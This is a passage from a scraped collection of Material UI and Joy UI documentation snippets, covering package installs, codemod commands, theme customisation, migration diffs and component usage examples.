package which provides Material Design icons as React components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/icons-material\n```\n\n----------------------------------------\n\nTITLE: Basic React Popper Implementation\nDESCRIPTION: Demonstrates basic usage of the Popper component with a button trigger and simple positioned content.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/popper/popper.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport Box from '@mui/material/Box';\nimport Popper from '@mui/material/Popper';\n\nexport default function SimplePopper() {\n  const [anchorEl, setAnchorEl] = React.useState(null);\n\n  const handleClick = (event) => {\n    setAnchorEl(anchorEl ? null : event.currentTarget);\n  };\n\n  const open = Boolean(anchorEl);\n  const id = open ? 'simple-popper' : undefined;\n\n  return (\n    <div>\n      <button aria-describedby={id} type=\"button\" onClick={handleClick}>\n        Toggle Popper\n      </button>\n      <Popper id={id} open={open} anchorEl={anchorEl}>\n        <Box sx={{ border: 1, p: 1, bgcolor: 'background.paper' }}>\n          The content of the Popper.\n        </Box>\n      </Popper>\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Setting CSP Header with Nonce in JavaScript\nDESCRIPTION: Example showing how to set the Content-Security-Policy header with a nonce value to allow specific inline styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/content-security-policy/content-security-policy.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nheader('Content-Security-Policy').set(\n  `default-src 'self'; style-src 'self' 'nonce-${nonce}';`,\n);\n```\n\n----------------------------------------\n\nTITLE: Running Dialog Classes Codemod Command\nDESCRIPTION: Command to automatically update deprecated Dialog class names in a codebase using MUI's codemod tool.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/dialog-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Customizing theme.applyStyles Implementation for Template Literals\nDESCRIPTION: This example demonstrates how to override theme.applyStyles with a custom function to return a string for use in template literals instead of the default object return value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_8\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  cssVariables: {\n    colorSchemeSelector: '.mode-%s',\n  },\n  colorSchemes: {\n    dark: {},\n    light: {},\n  },\n  applyStyles: function (key: string, styles: any) {\n    // return a string instead of an object\n    return `*:where(.mode-${key}) & {${styles}}`;\n  },\n});\n\nconst StyledButton = styled('button')`\n  ${theme.applyStyles(\n    'dark', `\n      background: white;\n    `\n  )}\n`;\n```\n\n----------------------------------------\n\nTITLE: Customizing Autocomplete Props with SlotProps\nDESCRIPTION: Example showing how to add custom data-testid to the Autocomplete component's popper slot using slotProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/overriding-component-structure/overriding-component-structure.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete slotProps={{ popper: { 'data-testid': 'my-popper' } }} />\n```\n\n----------------------------------------\n\nTITLE: Menu with Popup State Management\nDESCRIPTION: Menu implementation using material-ui-popup-state package for state management.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_13\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"MenuPopupState.js\"}\n```\n\n----------------------------------------\n\nTITLE: TypeScript type augmentation for adding new typography levels in Joy UI\nDESCRIPTION: Example of how to augment TypeScript types to include new custom typography levels in the theme structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_6\n\nLANGUAGE: ts\nCODE:\n```\n// You can put this to any file that's included in your tsconfig\ndeclare module '@mui/joy/styles' {\n  interface TypographySystemOverrides {\n    kbd: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating Svg Icon from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Svg Icon components from Material-UI v0.x to v1.x, including import path changes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n-import AddIcon from 'material-ui/svg-icons/Add';\n+import AddIcon from '@mui/icons-material/Add';\n\n <AddIcon />\n```\n\n----------------------------------------\n\nTITLE: Restoring Old MUI Joy UI Shadow Scale using extendTheme in JavaScript\nDESCRIPTION: Demonstrates how to override the default shadow scale in MUI Joy UI by providing the previous shadow definitions (`xs` to `xl`) within the `extendTheme` function. This configuration restores the visual appearance of shadows from before the update.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  shadow: {\n    xs: `var(--joy-shadowRing, 0 0 #000),\n        0 1px 2px 0 rgba(var(--joy-shadowChannel, 187 187 187) / 0.12)`,\n    sm: `var(--joy-shadowRing, 0 0 #000),\n        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.11),\n        0.5px 1.3px 1.8px -0.6px rgba(var(--joy-shadowChannel, 187 187 187) / 0.18),\n        1.1px 2.7px 3.8px -1.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.26)`,\n    md: `var(--joy-shadowRing, 0 0 #000),\n        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.12),\n        1.1px 2.8px 3.9px -0.4px rgba(var(--joy-shadowChannel, 187 187 187) / 0.17),\n        2.4px 6.1px 8.6px -0.8px rgba(var(--joy-shadowChannel, 187 187 187) / 0.23),\n        5.3px 13.3px 18.8px -1.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.29)`,\n    lg: `var(--joy-shadowRing, 0 0 #000),\n        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.11),\n        1.8px 4.5px 6.4px -0.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.13),\n        3.2px 7.9px 11.2px -0.4px rgba(var(--joy-shadowChannel, 187 187 187) / 0.16),\n        4.8px 12px 17px -0.5px rgba(var(--joy-shadowChannel, 187 187 187) / 0.19),\n        7px 17.5px 24.7px -0.7px rgba(var(--joy-shadowChannel, 187 187 187) / 0.21)`,\n    xl: `var(--joy-shadowRing, 0 0 #000),\n        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.11), \n        1.8px 4.5px 6.4px -0.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.13), \n        3.2px 7.9px 11.2px -0.4px rgba(var(--joy-shadowChannel, 187 187 187) / 0.16), \n        4.8px 12px 17px -0.5px rgba(var(--joy-shadowChannel, 187 187 187) / 0.19), \n        7px 17.5px 24.7px -0.7px rgba(var(--joy-shadowChannel, 187 187 187) / 0.21), \n        10.2px 25.5px 36px -0.9px rgba(var(--joy-shadowChannel, 187 187 187) / 0.24), \n        14.8px 36.8px 52.1px -1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.27), 21px 52.3px 74px -1.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.29)`,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Handling Portal Styling with styled-components\nDESCRIPTION: Demonstrates a workaround for styling components that use portals, such as Tooltip. The approach passes the className to the popper class to ensure styles are applied correctly.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_10\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { styled } from '@mui/material/styles';\nimport Button from '@mui/material/Button';\nimport Tooltip from '@mui/material/Tooltip';\n\nconst StyledTooltip = styled(({ className, ...props }) => (\n  <Tooltip {...props} classes={{ popper: className }} />\n))`\n  & .MuiTooltip-tooltip {\n    background: navy;\n  }\n`;\n```\n\n----------------------------------------\n\nTITLE: Comparing Old and New MUI Joy UI Typography Levels\nDESCRIPTION: Illustrates the restructuring of the default typography level scale (`theme.typography.*`). It shows the removal of `display1`, `display2`, `h5`, `h6`, `body1` through `body5`, and the addition of `title-lg`, `title-md`, `title-sm`, `body-lg`, `body-md`, `body-sm`, and `body-xs`. Recommendations for replacements are provided in the comments.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_12\n\nLANGUAGE: diff\nCODE:\n```\n  h1\n  h2\n  h3\n  h4\n+ title-lg\n+ title-md\n+ title-sm\n+ body-lg\n+ body-md\n+ body-sm\n+ body-xs\n- display1\n- display2\n- h5 // recommend to use `title-lg` instead\n- h6 // recommend to use `title-md` instead\n- body1 // recommend to use `body-md` instead\n- body2 // recommend to use `body-sm` instead\n- body3 // recommend to use `body-xs` instead\n- body4\n- body5\n```\n\n----------------------------------------\n\nTITLE: Using Flattened Props with MUI CSS Utility Components in React\nDESCRIPTION: This snippet shows how to use flattened props with MUI CSS utility components like Box, Typography, Stack, and Grid. It demonstrates the usage of display, color, and margin props directly on these components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q1-update.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box display=\"grid\" />\n<Typography p={2} color=\"text.secondary\" />\n<Stack mt={1} />\n<Grid color=\"success.main\" />\n```\n\n----------------------------------------\n\nTITLE: Customizing Border Colors with Material-UI Box Component\nDESCRIPTION: Examples of applying different border colors using the Box component with the sx prop. Demonstrates using theme colors like primary, secondary, error, and text variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/borders/borders.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ borderColor: 'primary.main' }}>…\n<Box sx={{ borderColor: 'secondary.main' }}>…\n<Box sx={{ borderColor: 'error.main' }}>…\n<Box sx={{ borderColor: 'grey.500' }}>…\n<Box sx={{ borderColor: 'text.primary' }}>…\n```\n\n----------------------------------------\n\nTITLE: Using Typography Color Prop with Theme Colors in React\nDESCRIPTION: Example of using the Typography color prop with direct theme color values, which is still supported in Material UI v6 for specific theme colors.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_19\n\nLANGUAGE: jsx\nCODE:\n```\n<Typography color=\"textSecondary\">Secondary text</Typography>\n```\n\n----------------------------------------\n\nTITLE: Implementing Responsive Element Hiding in Material-UI\nDESCRIPTION: Examples of responsive display properties to hide elements based on screen size. This demonstrates how to show or hide content for different device sizes using Material-UI's breakpoint system.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ display: { xs: 'block', md: 'none' } }}>\n  hide on screens wider than md\n</Box>\n<Box sx={{ display: { xs: 'none', md: 'block' } }}>\n  hide on screens smaller than md\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Migrating Badge Component Props in Theme Configuration\nDESCRIPTION: Shows how to update the theme defaultProps for Badge component from deprecated 'components/componentsProps' pattern to the newer 'slots/slotProps' approach.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\n MuiBadge: {\n   defaultProps: {\n-    components: { Root: CustomRoot }\n-    componentsProps: { root: { testid: 'test-id' }}\n+    slots: { root: CustomRoot },\n+    slotProps: { root: { testid: 'test-id' } },\n  },\n },\n```\n\n----------------------------------------\n\nTITLE: Alert DOM Structure - HTML\nDESCRIPTION: Example of the DOM structure for a basic Alert component showing the root element, icon, message, and action areas\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/alert/alert.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiPaper-root MuiAlert-root\" role=\"alert\">\n  <div class=\"MuiAlert-icon\">\n    <!-- svg icon here -->\n  </div>\n  <div class=\"MuiAlert-message\">This is how an Alert renders in the DOM.</div>\n  <div class=\"MuiAlert-action\">\n    <!-- optional action element here -->\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Link Underline Hover Codemod Example\nDESCRIPTION: This codemod applies the underline=\"hover\" property to Link components that don't define an underline prop. This maintains the same behavior as in Material-UI v4.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_91\n\nLANGUAGE: diff\nCODE:\n```\n-<Link />\n+<Link underline=\"hover\" />\n```\n\n----------------------------------------\n\nTITLE: Running InputLabel Size Codemod for v7 Migration\nDESCRIPTION: Command to run the Material UI codemod that automatically updates InputLabel size prop values from 'normal' to 'medium' for consistency with other components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod v7.0.0/input-label-size-normal-medium <path/to/folder>\n```\n\n----------------------------------------\n\nTITLE: Applying typography styles with the sx prop in Joy UI\nDESCRIPTION: Example of using the sx prop with the typography property to apply theme typography styles to any component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n// to apply the `theme.typography['body-sm']` styles:\n<Box sx={{ typography: 'body-sm' }}>Small text</Box>\n```\n\n----------------------------------------\n\nTITLE: Updating Typography Style Overrides in Material-UI v5 Theme\nDESCRIPTION: This snippet demonstrates how to update the theme configuration for Typography component style overrides. It replaces static style keys with a callback function that uses ownerState to apply conditional styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_47\n\nLANGUAGE: diff\nCODE:\n```\n const theme = createTheme({\n   components: {\n     MuiTypography: {\n-      styleOverrides: {\n-        colorSecondary: {\n-          marginTop: '20px',\n-        },\n-      },\n+      styleOverrides: ({ ownerState }) => ({\n+        ...ownerState.color === 'secondary' && {\n+          marginTop: '20px',\n+        },\n+      }),\n     },\n   },\n });\n```\n\n----------------------------------------\n\nTITLE: Minimal TypeScript Type Definition for Tabbed Display (TypeScript)\nDESCRIPTION: This snippet shows a simple empty type alias `type A = {}` in TypeScript. It's intended as example code within the 'TS' tab of a `@mui/docs/HighlightedCodeWithTabs` component configuration, demonstrating how to embed code snippets within component props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/codeblock.md#2025-04-22_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\ntype A = {}\n```\n\n----------------------------------------\n\nTITLE: Triggering Input Focus Ring Programmatically\nDESCRIPTION: Demonstrates how to trigger the input's focus ring using a CSS variable, useful for custom focus management.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/input/input.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Input\n  sx={{\n    '--Input-focused': 1,\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Updating Modal Event Handling in React\nDESCRIPTION: Replaces specific event props with more generic onClose handlers in Modal components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n <Modal\n-  disableBackdropClick\n-  onClose={handleClose}\n+  onClose={(event, reason) => {\n+    if (reason !== 'backdropClick') {\n+      handleClose(event, reason);\n+    }\n+  }}\n />\n```\n\nLANGUAGE: diff\nCODE:\n```\n <Modal\n-  onEscapeKeyDown={handleEscapeKeyDown}\n+  onClose={(event, reason) => {\n+    if (reason === 'escapeKeyDown') {\n+      handleEscapeKeyDown(event);\n+    }\n+  }}\n />\n```\n\n----------------------------------------\n\nTITLE: Styling Implementation with CSS Classes\nDESCRIPTION: Example demonstrating the styling structure using CSS classes with variants and modifiers\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/api/api.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nconst styles = {\n  root: {\n    color: green[600],\n    '&$checked': {\n      color: green[500],\n    },\n  },\n  checked: {},\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Fab Variant Prop in React\nDESCRIPTION: Changes the Fab 'variant' prop value from 'round' to 'circular'. This codemod updates the Fab component to use the new variant naming in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_83\n\nLANGUAGE: diff\nCODE:\n```\n-<Fab variant=\"round\" />\n+<Fab variant=\"circular\" />\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/fab-variant <path>\n```\n\n----------------------------------------\n\nTITLE: Importing Shadows from Material-UI System (JavaScript)\nDESCRIPTION: This snippet shows how to import the shadows utility from the Material-UI system package. This import is necessary to use the boxShadow prop in components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/shadows/shadows.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { shadows } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Updating Tabs onChange event type in React TypeScript\nDESCRIPTION: Changes the event type in onChange to React.SyntheticEvent instead of React.ChangeEvent for Tabs component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_34\n\nLANGUAGE: diff\nCODE:\n```\n-<Tabs onChange={(event: React.ChangeEvent<{}>, value: unknown) => {}} />\n+<Tabs onChange={(event: React.SyntheticEvent, value: unknown) => {}} />\n```\n\n----------------------------------------\n\nTITLE: Defining Spacing CSS Variables in Grid v2 Container (JavaScript)\nDESCRIPTION: Demonstrates how the Grid v2 container component sets CSS custom properties (`--Grid-rowSpacing`, `--Grid-columnSpacing`) based on the value of its `spacingProp`. This allows child items to reference these variables for their own styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/build-layouts-faster-with-grid-v2.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n// The code is simplified for readability\n{\n  '--Grid-rowSpacing': spacingProp,\n  '--Grid-columnSpacing': spacingProp,\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Accordion Components in React\nDESCRIPTION: Basic imports required to use the Joy UI Accordion components. Includes imports for Accordion, AccordionDetails, AccordionGroup, and AccordionSummary components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/accordion/accordion.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Accordion from '@mui/joy/Accordion';\nimport AccordionDetails from '@mui/joy/AccordionDetails';\nimport AccordionGroup from '@mui/joy/AccordionGroup';\nimport AccordionSummary from '@mui/joy/AccordionSummary';\n```\n\n----------------------------------------\n\nTITLE: Installing Roboto Font via Fontsource in React\nDESCRIPTION: Commands to install the Roboto font using Fontsource with different package managers (npm, pnpm, yarn).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/typography/typography.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @fontsource/roboto\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @fontsource/roboto\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @fontsource/roboto\n```\n\n----------------------------------------\n\nTITLE: Configuring TypeScript Theme Augmentation\nDESCRIPTION: TypeScript code example showing how to extend the default theme structure with lab components using module augmentation and apply custom styles to lab components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/about-the-lab/about-the-lab.md#2025-04-22_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nimport type {} from '@mui/lab/themeAugmentation';\n\nconst theme = createTheme({\n  components: {\n    MuiTimeline: {\n      styleOverrides: {\n        root: {\n          backgroundColor: 'red',\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Renaming GridList to ImageList in React\nDESCRIPTION: Renames 'GridList*' components to 'ImageList*'. This codemod updates the component names to reflect the new naming convention in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_86\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/grid-list-component <path>\n```\n\n----------------------------------------\n\nTITLE: Configuring RTL with styled-components\nDESCRIPTION: Setup for RTL support with styled-components by using StyleSheetManager with the stylis-plugin-rtl plugin.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nimport { StyleSheetManager } from 'styled-components';\nimport rtlPlugin from 'stylis-plugin-rtl';\n\nfunction Rtl(props) {\n  return (\n    <StyleSheetManager stylisPlugins={[rtlPlugin]}>\n      {props.children}\n    </StyleSheetManager>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Styling Material UI with Styled Components\nDESCRIPTION: Demonstrates how to use styled-components with Material UI by utilizing the styled utility from Material UI's styles package, allowing direct theme access.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\nimport { styled } from '@mui/material/styles';\n\nconst CustomizedSlider = styled(Slider)`\n  color: #20b2aa;\n\n  :hover {\n    color: #2e8b57;\n  }\n`;\n\nexport default function StyledComponents() {\n  return <CustomizedSlider defaultValue={30} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding new scroll button props to Tabs in React\nDESCRIPTION: Splits the API that controls scroll buttons into two props: scrollButtons and allowScrollButtonsMobile for Tabs component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_35\n\nLANGUAGE: diff\nCODE:\n```\n-<Tabs scrollButtons=\"on\" />\n-<Tabs scrollButtons=\"desktop\" />\n-<Tabs scrollButtons=\"off\" />\n+<Tabs scrollButtons allowScrollButtonsMobile />\n+<Tabs scrollButtons />\n+<Tabs scrollButtons={false} />\n```\n\n----------------------------------------\n\nTITLE: Replacing Hidden Component with useMediaQuery (JS Implementation)\nDESCRIPTION: Shows how to replace the deprecated Hidden component (JavaScript implementation) with the useMediaQuery hook for responsive display control.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_19\n\nLANGUAGE: diff\nCODE:\n```\n-<Hidden implementation=\"js\" xlUp><Paper /></Hidden>\n+const hidden = useMediaQuery(theme => theme.breakpoints.up('xl'));\n+return hidden ? null : <Paper />;\n```\n\n----------------------------------------\n\nTITLE: Migrating Accordion Props to Slot Pattern in Material UI v7 (Diff)\nDESCRIPTION: Shows the change required to migrate the `Accordion` component from using `TransitionComponent` and `TransitionProps` to the new `slots` and `slotProps` pattern introduced and standardized in Material UI v7. This pattern provides greater flexibility and consistency for replacing or modifying component inner elements. This specific example demonstrates replacing a custom transition component and its props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v7-is-here.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n <Accordion\n-  TransitionComponent={CustomTransition}\n-  TransitionProps={{ unmountOnExit: true }}\n+  slots={{ transition: CustomTransition }}\n+  slotProps={{ transition: { unmountOnExit: true } }}\n />\n```\n\n----------------------------------------\n\nTITLE: Migrating from Theme Direction to RtlProvider\nDESCRIPTION: This snippet shows how to migrate from using theme.direction to RtlProvider and useRtl hook for right-to-left support.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_27\n\nLANGUAGE: diff\nCODE:\n```\n+ import RtlProvider from '@mui/material-pigment-css/RtlProvider';\n\n function App() {\n+  const [rtl, setRtl] = React.useState(false);\n   return (\n+    <RtlProvider value={rtl}>\n       {/* Your app */}\n+    </RtlProvider>\n   )\n }\n```\n\nLANGUAGE: diff\nCODE:\n```\n- import { useTheme } from '@mui/material/styles';\n+ import { useRtl } from '@mui/material-pigment-css/RtlProvider';\n\n function App() {\n-  const theme = useTheme();\n+  const isRtl = useRtl();\n\n   return (\n     <Box sx={{ display: 'flex', alignItems: 'center', pl: 1, pb: 1 }}>\n       <IconButton aria-label=\"previous\">\n-        {theme.direction === 'rtl' ? <SkipNextIcon /> : <SkipPreviousIcon />}\n+        {isRtl ? <SkipNextIcon /> : <SkipPreviousIcon />}\n       </IconButton>\n       <IconButton aria-label=\"play/pause\">\n         <PlayArrowIcon sx={{ height: 38, width: 38 }} />\n       </IconButton>\n       <IconButton aria-label=\"next\">\n-        {theme.direction === 'rtl' ? <SkipPreviousIcon /> : <SkipNextIcon />}\n+        {isRtl ? <SkipPreviousIcon /> : <SkipNextIcon />}\n       </IconButton>\n     </Box>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Setting Font Style in Material-UI with JSX\nDESCRIPTION: Illustrates how to set font style (normal, italic, oblique) using the Box component in Material-UI. This affects the slant of the text.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ fontStyle: 'normal' }}>…\n<Box sx={{ fontStyle: 'italic' }}>…\n<Box sx={{ fontStyle: 'oblique' }}>…\n```\n\n----------------------------------------\n\nTITLE: Migrating Toggle from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Toggle components from Material-UI v0.x to v1.x using the new Switch component with updated prop names.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\n-import Toggle from 'material-ui/Toggle';\n+import Switch from '@material-ui/core/Switch';\n\n-<Toggle\n-  toggled={this.state.checkedA}\n-  onToggle={this.handleToggle}\n-/>\n+<Switch\n+  checked={this.state.checkedA}\n+  onChange={this.handleSwitch}\n+/>\n```\n\n----------------------------------------\n\nTITLE: Importing Tab Components from Joy UI\nDESCRIPTION: Basic import statement for the main Tab components from Joy UI. This snippet shows how to import the Tabs, TabList, and Tab components needed for implementing tabbed interfaces.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/tabs/tabs.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Tabs from '@mui/joy/Tabs';\nimport TabList from '@mui/joy/TabList';\nimport Tab from '@mui/joy/Tab';\n```\n\n----------------------------------------\n\nTITLE: Installing MUI X Premium Package with npm - JavaScript\nDESCRIPTION: This snippet demonstrates how to install the MUI X Premium data grid package using npm. It is necessary for users who want to upgrade to or start using the Premium features in their projects. The command should be run in the terminal, and it requires Node.js and npm to be installed on the development machine. The result is that the @mui/x-data-grid-premium package will be added to the project's dependencies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/premium-plan-release.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nnpm install @mui/x-data-grid-premium\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Button Link with React Router\nDESCRIPTION: This snippet shows how to create a custom button link that works with React Router by forwarding refs and overriding the role attribute to avoid accessibility issues.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/routing/routing.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nconst LinkBehavior = React.forwardRef((props, ref) => (\n  <RouterLink ref={ref} to=\"/\" {...props} role={undefined} />\n));\n```\n\n----------------------------------------\n\nTITLE: Configuring SwipeableDrawer for iOS Compatibility\nDESCRIPTION: Code snippet showing how to configure SwipeableDrawer component with special handling for iOS devices, including performance optimizations and disabling discovery feature for iOS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/drawers/drawers.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst iOS =\n  typeof navigator !== 'undefined' && /iPad|iPhone|iPod/.test(navigator.userAgent);\n\n<SwipeableDrawer disableBackdropTransition={!iOS} disableDiscovery={iOS} />;\n```\n\n----------------------------------------\n\nTITLE: Controlling Display for Print Media in Material-UI\nDESCRIPTION: Example of using displayPrint property to control element visibility during printing. This allows developers to hide certain elements when printing and show others that are only meant for print output.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ display: 'block', displayPrint: 'none' }}>\n  Screen Only (Hide on print only)\n</Box>\n<Box sx={{ display: 'none', displayPrint: 'block' }}>\n  Print Only (Hide on screen only)\n</Box>\n```\n\n----------------------------------------\n\nTITLE: CSS Specificity Example for Styling MUI Components\nDESCRIPTION: Example of a React component using the Chip component with a CSS class for styling the delete icon. This demonstrates how to apply custom styles to Material UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_11\n\nLANGUAGE: js\nCODE:\n```\nimport './style.css';\nimport Chip from '@mui/material/Chip';\n\nconst ChipWithGreenIcon = () => (\n  <Chip\n    classes={{ deleteIcon: 'green' }}\n    label=\"delete icon is green\"\n    onDelete={() => {}}\n  />\n);\n```\n\n----------------------------------------\n\nTITLE: Updating Button Color Prop in React\nDESCRIPTION: Removes the outdated 'color' prop value 'default' from Button components. This codemod helps migrate to the new Button API in Material-UI v5.\nSOURCE: 